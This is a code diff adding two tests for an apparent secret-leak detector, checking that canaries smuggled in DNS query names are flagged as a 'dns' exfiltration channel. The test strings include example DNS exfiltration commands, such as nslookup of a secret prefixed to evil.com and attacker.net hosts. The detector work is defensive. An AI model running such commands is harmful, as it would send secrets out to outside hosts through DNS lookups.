@@ -66,6 +66,22 @@ def test_find_urls_channels():
     assert channels["https://e.example/q"] == "bare" and len(channels) == 5
 
 
+def test_find_urls_detects_dns_exfil_channel():
+    # A canary smuggled as DNS subdomain labels (no http scheme) is caught as the "dns" channel, while an ordinary
+    # single-label host (host.tld) and a hostname already inside an http URL are not re-reported as dns.
+    channels = {u: ch for ch, u in find_urls("run nslookup K7QM-2XPA.data.evil.com and see https://b.example/x")}
+    assert channels.get("K7QM-2XPA.data.evil.com") == "dns"
+    assert "b.example" not in channels            # single-dot host is not a dns candidate
+    assert channels["https://b.example/x"] == "bare"  # hostname inside an http URL stays the http channel, not dns
+
+
+def test_find_exfil_over_dns():
+    s = key_canary()
+    hit = find_exfil(f"nslookup {s}.exfil.attacker.net", s)
+    assert hit is not None and hit.channel == "dns" and s in hit.host  # canary smuggled in the DNS query name
+    assert find_exfil(f"nslookup {key_canary()}.exfil.attacker.net", s) is None  # a different secret is not this exfil
+
+
 def test_find_urls_bounded():
     assert len(find_urls(" ".join(f"https://h{i}.example" for i in range(500)))) == canary.MAX_URLS
 
